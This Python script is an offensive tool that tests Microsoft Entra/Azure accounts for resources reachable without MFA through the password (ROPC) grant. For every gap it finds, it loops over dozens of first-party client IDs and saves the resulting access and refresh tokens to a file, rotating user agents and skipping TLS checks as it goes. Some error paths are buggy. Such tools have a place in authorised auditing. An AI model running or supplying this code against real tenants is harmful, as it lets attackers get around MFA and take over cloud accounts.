#!/usr/bin/env python3

import argparse, requests, json, getpass, urllib3, random
from base64 import urlsafe_b64decode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
]

resources = {
    "Azure Graph API": "https://graph.windows.net",
    "Azure Management API": "https://management.azure.com",
    "Azure Data Catalog": "https://datacatalog.azure.com",
    "Azure Key Vault": "https://vault.azure.net",
    "Cloud Webapp Proxy": "https://proxy.cloudwebappproxy.net/registerapp",
    "Database": "https://database.windows.net",
    "Microsoft Graph API": "https://graph.microsoft.com",
    "msmamservice": "https://msmamservice.api.application",
    "Office Management": "https://manage.office.com",
    "Office Apps": "https://officeapps.live.com",
    "OneNote": "https://onenote.com",
    "Outlook": "https://outlook.office365.com",
    "Outlook SDF": "https://outlook-sdf.office.com",
    "Sara": "https://api.diagnostics.office.com",
    "Skype For Business": "https://api.skypeforbusiness.com",
    "Spaces Api": "https://api.spaces.skype.com",
    "Webshell Suite": "https://webshell.suite.office.com",
    "Windows Management API": "https://management.core.windows.net",
    "Yammer": "https://api.yammer.com"
}


# https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv
# https://learn.microsoft.com/en-us/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in
client_ids = {
    "Accounts Control UI" : "a40d7d7d-59aa-447e-a655-679a4107e548",
    "Copilot App" : "14638111-3389-403d-b206-a6a71d9f8f16",
    "Designer App" : "598ab7bb-a59c-4d31-ba84-ded22c220dbd",
    "Enterprise Roaming and Backup" : "60c8bde5-3167-4f92-8fdb-059f6176dc0f",
    "Intune MAM" : "6c7e8096-f593-4d72-807f-a5f86dcc9c77",
    "Loop" : "0922ef46-e1b9-4f7e-9134-9ad00547eb41",
    "M365 Compliance Drive Client" : "be1918be-3fe3-4be9-b32b-b542fc27f02e",
    "Microsoft 365 Copilot" : "0ec893e0-5785-4de6-99da-4ed124e5296c",
    "Microsoft Authentication Broker" : "29d9ed98-a469-4536-ade2-f981bc1d605e",
    "Microsoft Authenticator App" : "4813382a-8fa7-425e-ab75-3b753aab3abb",
    "Microsoft Azure CLI" : "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "Microsoft Azure PowerShell" : "1950a258-227b-4e31-a9cf-717495945fc2",
    "Microsoft Bing Search for Microsoft Edge" : "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8",
    "Microsoft Bing Search" : "cf36b471-5b44-428c-9ce7-313bf84528de",
    "Microsoft Defender for Mobile" : "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3",
    "Microsoft Defender Platform" : "cab96880-db5b-4e15-90a7-f3f1d62ffe39",
    "Microsoft Docs" : "18fbca16-2224-45f6-85b0-f7bf2b39b3f3",
    "Microsoft Edge Enterprise New Tab Page" : "d7b530a4-7680-4c23-a8bf-c52c121d2e87",
    "Microsoft Edge MSAv2" : "82864fa0-ed49-4711-8395-a0e6003dca1f",
    "Microsoft Edge" : "e9c51622-460d-4d3d-952d-966a5b1da34c",
    "Microsoft Edge2" : "ecd6b820-32c2-49b6-98a6-444530e5a77a",
    "Microsoft Edge3" : "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34",
    "Microsoft Exchange REST API Based Powershell" : "fb78d390-0c51-40cd-8e17-fdbfab77341b",
    "Microsoft Flow" : "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0",
    "Microsoft Intune Company Portal" : "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223",
    "Microsoft Intune Windows Agent" : "fc0f3af4-6835-4174-b806-f7db311fd2f3",
    "Microsoft Lists App on Android" : "a670efe7-64b6-454f-9ae9-4f1cf27aba58",
    "Microsoft Office" : "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "Microsoft Planner" : "66375f6b-983f-4c2c-9701-d680650f588f",
    "Microsoft Power BI" : "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12",
    "Microsoft Stream Mobile Native" : "844cca35-0656-46ce-b636-13f48b0eecbd",
    "Microsoft Teams - Device Admin Agent" : "87749df4-7ccf-48f8-aa87-704bad0e0e16",
    "Microsoft Teams-T4L" : "8ec6bc83-69c8-4392-8f08-b3c986009232",
    "Microsoft Teams" : "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "Microsoft To-Do client" : "22098786-6e16-43cc-a27d-191a01a1e3b5",
    "Microsoft Tunnel" : "eb539595-3fe1-474e-9c1d-feb3625d1be5",
    "Microsoft Whiteboard Client" : "57336123-6e14-4acc-8dcf-287b6088aa28",
    "ODSP Mobile Lists App" : "540d4ff4-b4c0-44c1-bd06-cab1782d582a",
    "Office 365 Exchange Online" : "00000002-0000-0ff1-ce00-000000000000",
    "Office 365 Management" : "00b41c95-dab0-4487-9791-b9d2c32c80f2",
    "Office UWP PWA" : "0ec893e0-5785-4de6-99da-4ed124e5296c",
    "OneDrive iOS App" : "af124e86-4e96-495a-b70a-90f90ab96707",
    "OneDrive SyncEngine" : "ab9b8c07-8f02-4f72-87fa-80105867a763",
    "OneDrive" : "b26aadf8-566f-4478-926f-589f601d9c74",
    "Outlook Lite" : "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
    "Outlook Mobile" : "27922004-5251-4030-b22d-91ecd9a37ea4",
    "PowerApps" : "4e291c71-d680-4d0e-9640-0a3358e31177",
    "SharePoint Android" : "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d",
    "SharePoint" : "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0",
    "Universal Store Native Client" : "268761a2-03f3-40df-8a8b-c3db24145b6b",
    "Visual Studio" : "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
    "Windows Search" : "26a7ee05-5602-4d76-a7ba-eae8b7b67941",
    "Windows Spotlight" : "1b3c667f-cde3-4090-b60b-3d2abd0117f0",
    "Yammer iPhone" : "a569458c-7f2b-45cb-bab9-b7dee514d112",
    "ZTNA Network Access Client Private" : "760282b4-0cfc-4952-b467-c8e0298fee16",
    "ZTNA Network Access Client" : "038ddad9-5bbe-4f64-b0cd-12434d1e633b",
}

def decode_jwt(token):
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        data = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(urlsafe_b64decode(data.encode()))
    except Exception:
        return {}

def ropc_request(tenant, username, password, resource, client_id, proxies):
    url = f"https://login.microsoftonline.com/{tenant}/oauth2/token"
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    data = {
        "grant_type": "password",
        "resource": resource,
        "client_id": client_id,
        "username": username,
        "password": password,
        "scope": "openid offline_access"
    }
    try:
        return requests.post(url, data=data, headers=headers, verify=False, proxies=proxies, timeout=15)
    except requests.exceptions.Timeout:
        return "timeout"
    except requests.exceptions.ConnectionError:
        return "connection_error"
    except Exception as e:
        return f"error:{type(e).__name__}"
        return None

def get_error_info(response):
    """Parse error response and return (error_code, short_description)"""
    try:
        body = response.json()
        error = body.get("error", "unknown")
        desc = body.get("error_description", "").split("\r\n")[0]
        return error, desc
    except:
        return "unknown", f"HTTP {response.status_code}"

def validate_credentials(tenant, username, password, proxies):
    """Pre-flight check to avoid account lockouts from bad passwords"""
    print("[*] Validating credentials...")
    
    resp = ropc_request(tenant, username, password, 
                        resources["Microsoft Graph API"],
                        client_ids["Microsoft Office"], proxies)
    
    if resp is None:
        print(f"{RED}[!] No response from login endpoint. Check network/proxy.{RESET}")
        return False
    
    if resp.status_code == 200:
        print(f"{GREEN}[+] Credentials valid.{RESET}")
        return True
    
    error, desc = get_error_info(resp)
    
    # MFA blocked the probe but creds are valid
    if error == "interaction_required":
        print(f"{GREEN}[+] Credentials valid (MFA blocked probe).{RESET}")
        return True
    
    print(f"{RED}[!] Credential check failed: {desc}{RESET}")
    print(f"{RED}[!] Exiting to prevent account lockout.{RESET}")
    return False

def main():
    parser = argparse.ArgumentParser(description="Azure ROPC MFA audit with token dump")
    parser.add_argument("-u", "--user", required=True, help="Username/UPN")
    parser.add_argument("-p", "--passw", help="Password (omit to be prompted)")
    parser.add_argument("--tenant", default="common", help="Tenant ID or domain")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--output", default="tokens.json", help="Output JSON file")
    args = parser.parse_args()

    username = args.user
    password = args.passw or getpass.getpass("Password: ")
    tenant = args.tenant
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    # Pre-flight credential check
    if not validate_credentials(tenant, username, password, proxies):
        return

    print(f"\n[+] Scanning {len(resources)} resources for MFA enforcement...\n")
    results = {"no_mfa_resources": [], "tokens": []}

    for name, url in resources.items():
        probe_id = client_ids["Microsoft Office"]
        r = ropc_request(tenant, username, password, url, probe_id, proxies)
        if r is None or isinstance(r, str):
            print(f"{YELLOW}[?] {name}: {r or 'No response'}{RESET}")
            continue

        if r.status_code == 200:
            print(f"{GREEN}[+] {name}: MFA Not Required (Token Issued){RESET}")
            results["no_mfa_resources"].append((name, url))
        else:
            error, desc = get_error_info(r)
            if error == "interaction_required":
                print(f"{RED}[-] {name}: MFA Required{RESET}")
            elif error == "invalid_resource":
                print(f"{YELLOW}[.] {name}: Invalid resource (skipped){RESET}")
            elif error == "unauthorized_client":
                print(f"{YELLOW}[.] {name}: Client not authorized (skipped){RESET}")
            else:
                print(f"{RED}[-] {name}: {error}{RESET}")

    if not results["no_mfa_resources"]:
        print(f"\n{RED}[!] No MFA gaps detected.{RESET}\n")
        return

    print(f"\n[+] Enumerating client_ids for {len(results['no_mfa_resources'])} no-MFA resources...\n")
    for rname, rurl in results["no_mfa_resources"]:
        for cname, cid in client_ids.items():
            resp = ropc_request(tenant, username, password, rurl, cid, proxies)
            if not resp or resp.status_code != 200:
                continue
            j = resp.json()
            access = j.get("access_token")
            refresh = j.get("refresh_token")
            decoded = decode_jwt(access or "")
            results["tokens"].append({
                "resource": rname,
                "resource_url": rurl,
                "client_name": cname,
                "client_id": cid,
                "aud": decoded.get("aud", ""),
                "appid": decoded.get("appid", ""),
                "access_token": access,
                "refresh_token": refresh
            })
            print(f"{GREEN}[TOKEN]{RESET} {rname} <- {cname}")

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Tokens and results saved to {args.output}\n")

if __name__ == "__main__":
    main()
